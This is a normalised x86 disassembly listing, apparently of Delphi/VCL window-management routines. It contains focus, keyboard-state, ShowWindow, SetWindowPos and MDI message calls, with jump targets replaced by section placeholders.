sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_456588
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_46b280
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_46a840
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_46b29c
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_462c24
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_462c24
sub_46b2dc
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_46b314
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_404100
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_46b348
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46b499
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b4a0
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_46b29c
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_44c734
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_417330
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_44f36c
lea eax [ ebp - 0x1c ]
call sub_406cf0
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_46b29c
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_46b2dc
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_46f9ac
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_46fa14
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_46fa14
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_46b314
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_417330
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_44f36c
lea eax [ ebp - 0x1c ]
call sub_406cf0
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_46f944
test [ esi + 0x228 ] 0x8
je r-xdata
sub_46b4a8
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_46b51c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_46b548
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4545f0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_469558
lea edx [ ebp - 0x14 ]
call sub_46cd20
push ebp
mov eax [ ebp - 0x4 ]
call sub_469558
lea edx [ ebp - 0x24 ]
call sub_46cd20
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_46b51c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_469558
lea edx [ ebp - 0x24 ]
call sub_46cd20
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_46b51c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_46b51c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_46b51c
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_46b600
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4034ac
pop esi
pop ebx
retn
sub_46b624
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_4034ac
pop esi
pop ebx
retn
sub_46b648
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_4554d0
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_456588
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_456588
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_46b6e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46bc4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_46fdf8
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_46bc31
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bc38
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
xor eax eax
push ebp
push sub_46bb38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_4034ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_46b79c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4034ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46a890
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4535ac
jmp r-xdata
mov eax [ rw-data ]
call sub_46cf7c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44f258
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_456054
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_46cf70
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44f29c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_456054
call sub_4664d8
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46cfac
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44f258
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_46cf7c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44fab4
push 0x0
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_46cfa0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44f29c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_46cf70
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_469b40
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_469b40
jmp r-xdata
sub_46b7a1
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46f50c
call sub_403ae0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_46cf7c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44f258
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_46cf70
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44f29c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46cfac
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44f258
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_46cf7c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bc38
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44fab4
push 0x0
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_46cfa0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44f29c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_46cf70
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_469b40
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_469b40
jmp r-xdata
sub_46bb3d
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46f50c
call sub_403ae0
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46a890
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4535ac
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_456054
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bc38
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_456054
call sub_4664d8
mov ebx eax
sub_46bc84
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_46bcdc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424220
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46bd3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_46bd48
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_4034ac
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46bd74
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_46f4f8
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_4034ac
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_46bf14
jmp r-xdata
mov eax ebx
call sub_46bfb0
mov dl 0x1
mov eax ebx
call sub_469b00
jmp r-xdata
sub_46be18
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_46948c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_4694d8
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_46be7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46bee8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4034ac
mov eax [ ebp - 0x4 ]
xor edx edx
